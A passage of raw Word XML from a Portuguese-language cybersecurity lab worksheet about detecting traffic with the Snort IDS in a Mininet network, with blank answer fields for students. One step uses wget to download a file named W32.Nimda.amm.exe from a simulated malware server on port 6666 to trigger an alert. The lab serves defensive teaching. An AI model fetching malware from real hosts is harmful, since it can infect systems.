      <w:r w:rsidRPr="00C447C1">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>R1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> usando o comando abaixo:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50678870" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00C8638D" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>mininet</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> xterm R1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EEA1910" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00C8638D" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>mininet&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="367E8397" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:r>
        <w:t>Pergunta:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65D055A0" w14:textId="59233393" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL50"/>
        <w:spacing w:before="0"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">O shell </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>R1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> abre em uma janela de terminal com texto preto e fundo branco. Qual usuário está logado nesse shell? Qual é o indicador disso?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A12AF94" w14:textId="7ABAB0A6" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="AnswerLineL50"/>
      </w:pPr>
      <w:r>
        <w:t>Digite suas respostas aqui.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E66D7F" w14:textId="4BA2431B" w:rsidR="00CB6E06" w:rsidRDefault="00EA47B7" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL50"/>
        <w:rPr>
          <w:rStyle w:val="AnswerGray"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AnswerGray"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78038BD5" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="009C35C4" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">No shell do </w:t>
      </w:r>
      <w:r w:rsidRPr="009C35C4">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>R1</w:t>
      </w:r>
      <w:r>
        <w:t>, inicie o IDS baseado em Linux, Snort.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B185D65" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="009C35C4" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>[root @secOps analyst] #</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB6E06">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB6E06">
        <w:rPr>
          <w:rStyle w:val="CMDChar"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">/lab.support.files/scripts/start_snort.sh </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30C3BEA3" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="0042593E" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>Executando no modo IDS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60754FF9" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="0042593E" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>—== Inicializando Snort ==—</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F89FEB8" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="0042593E" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>Initializing Output Plugins!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BFD849A" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="0042593E" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>Initializing Preprocessors!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07D4E4C9" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="0042593E" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>Initializing Plug-ins!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D59A886" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>Parsing Rules file "/etc/snort/snort.conf"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43A2C451" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>&lt;output omitted&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="565234A3" w14:textId="355FA93F" w:rsidR="00CB6E06" w:rsidRPr="00B51975" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL50"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observação:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Você não verá um prompt, pois o Snort está sendo executado nesta janela. Se, por algum motivo, o Snort parar de funcionar e o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> prompt </w:t>
      </w:r>
      <w:r>
        <w:t>[root @secOps analist] # for exibido, execute novamente o script para iniciar o Snort. Snort deve estar executando para capturar alertas mais tarde no laboratório.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ABA298F" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">No prompt do </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>mininet da VM CyberOps Workstation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, abra shells para hosts </w:t>
      </w:r>
      <w:r w:rsidRPr="00545D02">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>H5</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>H10</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42D90C58" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="009C35C4" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>mininet</w:t>
      </w:r>
      <w:r w:rsidRPr="00C8638D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> xterm H5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BBB6B0E" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00C8638D" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>mininet</w:t>
      </w:r>
      <w:r w:rsidRPr="00C8638D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> xterm H10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0006BED3" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00C8638D" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>mininet&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DD343C0" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>O H10</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> simulará um servidor na Internet que hospeda malware. Em </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>H10</w:t>
      </w:r>
      <w:r>
        <w:t>, execute o script mal_server_start.sh para iniciar o servidor.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CDADED6" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00C8638D" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>[root @secOps analyst] #.</w:t>
      </w:r>
      <w:r w:rsidRPr="00C8638D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>/lab.support.files/scripts/mal_server_start.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03A3A72A" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>[root@secOps analyst]#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3850AD8E" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="009C35C4" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">No </w:t>
      </w:r>
      <w:r w:rsidRPr="00C8638D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>H10</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, use </w:t>
      </w:r>
      <w:r w:rsidRPr="00C8638D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>netstat</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> com as opções </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>-tunpa</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para verificar se o servidor web está sendo executado. Quando usado como mostrado abaixo, </w:t>
      </w:r>
      <w:r w:rsidRPr="009A2A63">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>netstat</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> lista todas as portas atualmente atribuídas aos serviços:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A1EFC60" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00C8638D" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>[root @secOps analyst] #</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> netstat -tunpa</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61C4B5E8" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>Active Internet connections (servers and established)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5283669D" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16046D01" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">tcp </w:t>
      </w:r>
      <w:r>
        <w:t>0 0 0.0.0.0:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">6666 </w:t>
      </w:r>
      <w:r>
        <w:t>0.0.0.0:*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> LISTEN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 1839/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>nginx</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: master </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42D67C48" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>[root@secOps analyst]#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="396AA37C" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Como visto pela saída acima, o servidor web leve </w:t>
      </w:r>
      <w:r w:rsidRPr="00274420">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>nginx</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> está sendo executado e ouvindo conexões na porta TCP 6666.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D9EB5A" w14:textId="53CC6C0D" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="004E2F9C">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Na janela do terminal </w:t>
      </w:r>
      <w:r w:rsidRPr="004E2F9C">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>R1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, uma instância do Snort está em execução. Para inserir mais comandos no </w:t>
      </w:r>
      <w:r w:rsidRPr="004E2F9C">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>R1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, abra outro terminal </w:t>
      </w:r>
      <w:r w:rsidRPr="004E2F9C">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>R1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> inserindo o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>xterm R1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> novamente na janela do terminal da </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">VM CyberOps Workstation </w:t>
      </w:r>
      <w:r>
        <w:t>. Você também pode querer organizar as janelas do terminal para que você possa ver e interagir com cada dispositivo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B2691B8" w14:textId="240DF874" w:rsidR="00CB6E06" w:rsidRPr="003E40EA" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Na nova guia do terminal </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>R1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, execute o comando </w:t>
      </w:r>
      <w:r w:rsidRPr="00C8638D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>tail</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> com a opção </w:t>
      </w:r>
      <w:r w:rsidRPr="00C8638D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>-f</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para monitorar o arquivo </w:t>
      </w:r>
      <w:r w:rsidRPr="00C8638D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>/var/log/snort/alert</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> em tempo real. Este arquivo é onde o snort está configurado para registrar alertas.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01B11843" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="006B299C" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>[root @sec0ps analyst] #</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> tail -f /var/log/snort/alert</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01FC82B5" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00C8638D" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL50"/>
      </w:pPr>
      <w:r>
        <w:t>Como nenhum alerta ainda foi registrado, o log deve estar vazio. No entanto, se você tiver executado este laboratório antes, as entradas de alerta antigas podem ser mostradas. Em ambos os casos, você não receberá um prompt depois de digitar este comando. Esta janela exibirá alertas à medida que eles acontecem.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F2F0E5B" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00050898" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Em </w:t>
      </w:r>
      <w:r w:rsidRPr="00AF6DD7">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>H5</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, use o comando </w:t>
      </w:r>
      <w:r w:rsidRPr="00C8638D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>wget</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para baixar um arquivo chamado </w:t>
      </w:r>
      <w:r w:rsidRPr="00C8638D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>W32.Nimda.amm.exe</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Projetado para baixar conteúdo via HTTP, </w:t>
      </w:r>
      <w:r w:rsidRPr="00C8638D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>wget</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> é uma ótima ferramenta para baixar arquivos de servidores web diretamente da linha de comando.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B46972A" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00C8638D" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>[root @secOps analyst] #</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> wget 209.165.202. 133:6666 /W32.Nimda.amm.exe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E21FDD9" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00902D2F" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>--2017-04-28 17:00:04-- http://209.165.202.133:6666/W32.Nimda.Amm.exe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="391454A2" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00902D2F" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>Connecting to 209.165.202.133:6666... connected.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BFFACC8" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00902D2F" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>HTTP request sent, awaiting response... 200 OK</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A945E01" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00902D2F" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>Length: 345088 (337K) [application/octet-stream]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E7350A" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00902D2F" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>Saving to: 'W32.Nimda.Amm.exe'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48EA9108" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00902D2F" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69CAB5EC" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00902D2F" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">W32.Nimda.Amm.exe 100%[==========================================&gt;] 337.00K --.-KB/s in 0.02s   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20B20CA8" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00902D2F" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="699C4E6A" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00902D2F" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>2017-04-28 17:00:04 (16.4 MB/s) - 'W32.Nimda.Amm.exe' saved [345088/345088]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C7919FE" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00902D2F" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CE6E4D0" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="004F369D" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>[root@secOps analyst]#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17711E81" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:r>
        <w:t>Pergunta:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00E4DA9B" w14:textId="6FAB3DDC" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:before="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Qual porta é usada ao se comunicar com o servidor web de malware? Qual é o indicador?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1943E800" w14:textId="69FB9D5F" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="AnswerLineL50"/>
      </w:pPr>
      <w:r>
        <w:t>Digite suas respostas aqui.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D280152" w14:textId="1C022B0A" w:rsidR="00CB6E06" w:rsidRDefault="00EA47B7" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
        <w:rPr>
          <w:rStyle w:val="AnswerGray"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AnswerGray"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ECEFC27" w14:textId="0045F131" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL50"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="underscore" w:pos="9360"/>
        </w:tabs>
      </w:pPr>
      <w:r>
        <w:t>O arquivo foi completamente baixado?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16428326" w14:textId="63EE77DD" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="009F3BE0">
      <w:pPr>
        <w:pStyle w:val="AnswerLineL50"/>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>Digite suas respostas aqui.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62C77EE7" w14:textId="3C0F765D" w:rsidR="00CB6E06" w:rsidRDefault="00EA47B7" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL50"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="underscore" w:pos="9360"/>
        </w:tabs>
        <w:rPr>
          <w:rStyle w:val="AnswerGray"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AnswerGray"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD05244" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL50"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="underscore" w:pos="9360"/>
        </w:tabs>
      </w:pPr>
      <w:r>
        <w:t>O IDS gerou algum alerta relacionado ao download do arquivo?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E7EB38C" w14:textId="2DE47B2F" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="009F3BE0">
      <w:pPr>
        <w:pStyle w:val="AnswerLineL50"/>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>Digite suas respostas aqui.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A5C5523" w14:textId="096A9D23" w:rsidR="00CB6E06" w:rsidRDefault="00EA47B7" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL50"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="underscore" w:pos="9360"/>
        </w:tabs>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AnswerGray"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
